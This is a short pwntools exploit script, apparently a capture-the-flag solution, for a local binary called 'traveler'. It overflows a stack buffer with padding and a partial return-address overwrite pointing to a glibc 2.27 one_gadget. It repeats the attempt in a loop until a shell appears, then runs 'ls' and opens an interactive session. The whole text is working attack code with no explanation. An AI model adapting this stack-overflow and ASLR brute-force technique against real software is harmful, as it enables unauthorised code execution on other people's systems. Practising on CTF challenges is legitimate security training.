#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

elf = ELF('./traveler')

one_gadget = '\xfc\xa2\x50' #0x10a2fc [rsp+0x70] == NULL glibc2.27-1.6
#one_gadget = '\xfc\xf2\x74'
while True:
	try:
		p = process('./traveler')
		p.recvuntil('who r u?')
		payload = 'A'*0x28 + one_gadget
		p.send(payload)

		#gdb.attach(p)
		#pause()
		p.recvuntil('How many travels can a person have in his life?')
		payload = 'A'*0x20
		p.sendline(payload)
		
		p.recv()
		p.sendline("ls")
		ret = p.recv()
		if not ret:
			p.close()
		p.interactive()
	except:
		p.close()
